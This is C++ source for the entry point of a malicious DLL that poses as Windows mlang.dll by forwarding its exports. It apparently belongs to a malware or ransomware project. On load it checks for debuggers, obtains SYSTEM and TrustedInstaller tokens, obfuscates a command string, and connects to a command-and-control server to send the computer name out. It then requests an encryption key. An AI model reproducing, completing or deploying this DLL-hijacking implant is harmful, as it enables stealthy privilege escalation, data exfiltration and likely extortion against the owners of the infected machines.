// dllmain.cpp : Defines the entry point for the DLL application.
#include "procutils.h"
#include "syscalls.h"
#include "client.h"
#include "net_common.h"

#include <thread>

#pragma comment(linker, "/export:IsConvertINetStringAvailable=C:\\Windows\\System32\\mlang.IsConvertINetStringAvailable,@110")
#pragma comment(linker, "/export:ConvertINetString=C:\\Windows\\System32\\mlang.ConvertINetString,@111")
#pragma comment(linker, "/export:ConvertINetUnicodeToMultiByte=C:\\Windows\\System32\\mlang.ConvertINetUnicodeToMultiByte,@112")
#pragma comment(linker, "/export:ConvertINetMultiByteToUnicode=C:\\Windows\\System32\\mlang.ConvertINetMultiByteToUnicode,@113")
#pragma comment(linker, "/export:ConvertINetReset=C:\\Windows\\System32\\mlang.ConvertINetReset,@114")
#pragma comment(linker, "/export:DllCanUnloadNow=C:\\Windows\\System32\\mlang.DllCanUnloadNow,@115")
#pragma comment(linker, "/export:DllGetClassObject=C:\\Windows\\System32\\mlang.DllGetClassObject,@116")
#pragma comment(linker, "/export:GetGlobalFontLinkObject=C:\\Windows\\System32\\mlang.GetGlobalFontLinkObject,@117")
#pragma comment(linker, "/export:LcidToRfc1766A=C:\\Windows\\System32\\mlang.LcidToRfc1766A,@120")
#pragma comment(linker, "/export:LcidToRfc1766W=C:\\Windows\\System32\\mlang.LcidToRfc1766W,@121")
#pragma comment(linker, "/export:Rfc1766ToLcidA=C:\\Windows\\System32\\mlang.Rfc1766ToLcidA,@122")
#pragma comment(linker, "/export:Rfc1766ToLcidW=C:\\Windows\\System32\\mlang.Rfc1766ToLcidW,@123")

//#pragma section(".didat",execute, read, write)
#pragma comment(linker, "/SECTION:.didat,ERW")

#pragma data_seg(".didat")
int _x = 0;
#pragma data_seg()


BOOL APIENTRY DllMain(HMODULE hModule,
					  DWORD  ul_reason_for_call,
					  LPVOID lpReserved
)
{
	switch ( ul_reason_for_call )
	{
	case DLL_PROCESS_ATTACH:		
		if ( !ProcessUtilities::Init() )
			return FALSE;

		ProcessUtilities::CheckNoDebugger();

		//if ( SandboxCompromise::SuspicousProcRunning() )
		//	ProcessUtilities::HaltProcessExecution();

		HANDLE escalatedPriv = ProcessUtilities::GetSystemToken();
		std::string strCmd   = std::string(HIDE("C:\\Windows\\System32\\cmd.exe /K whoami"));
		std::wstring wstrCmd = std::wstring(strCmd.begin(), strCmd.end());
		
		std::vector<wchar_t> cmd(wstrCmd.begin(), wstrCmd.end());
		cmd.push_back(L'\0');
		 
		STARTUPINFO si = { 0 };
		PROCESS_INFORMATION pi;
		
		HANDLE token = ProcessUtilities::GetTrustedInstallerToken();

		//ProcessUtilities::OpenProcessAsImposter(
		//	token,
		//	LOGON_WITH_PROFILE,
		//	NULL,
		//	cmd.data(),
		//	CREATE_NEW_CONSOLE,
		//	NULL,
		//	NULL,
		//	&si,
		//	&pi
		//);

		// try to connect to c2 server
		Client me;
		if ( !me.Connect() )
			me.~Client();

		me.SendComputerNameToServer();
		me.~Client();
		return FALSE;

		ClientRequest req(ClientRequest::REQUEST_PRIVATE_ENCRYPTION_KEY, me.GetSocket(TCP));
		//me.SendEncryptedMessageToServer(me.TCPServerDetails, req);
		me.MakeTCPRequest(req, TRUE);

		//NetCommon::TransmitData(req, me.TCPSocket, TCP, NetCommon::_default, TRUE, NetCommon::GetBIOFromString(me.Secrets.strPublicKey));

		while ( 1 ) {
			std::this_thread::sleep_for(std::chrono::seconds(1));
		}

		ProcessUtilities::Clean();

		//// query mac addresses

		break;
	}
	return TRUE;
}

